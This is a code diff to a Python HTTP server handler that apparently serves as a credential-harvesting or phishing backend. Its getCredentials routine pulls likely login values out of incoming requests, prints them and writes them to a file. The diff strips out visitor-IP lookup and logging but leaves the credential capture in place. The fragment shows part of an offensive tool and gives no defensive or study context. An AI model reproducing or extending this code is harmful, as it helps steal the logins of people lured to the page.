@@ -35,16 +35,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         values = response.getvalue()
         self.getCredentials(values)
 
-    def get_ip(self):
-        external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
-        return(external_ip)
-
     def log_message(self, format, *args):
-        if self.get_ip() not in self.ips:
-            self.ips.append(self.get_ip())
-            print(Fore.RED+'[+]IP Found:',self.get_ip())
-            print(Style.RESET_ALL)
-            logging.error(self.headers)
+        logging.error(self.headers)
 
 
     def getCredentials(self, values):
@@ -67,7 +59,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                             print('[+].::',possibles)
                             print("=" * 52 + "\n")
                             print(Style.RESET_ALL)
-                            file.write('IP: '+self.get_ip()+'\n'+'    '.join(possibles)+'\n')
                             count = 0
                             possibles = []
                             try:
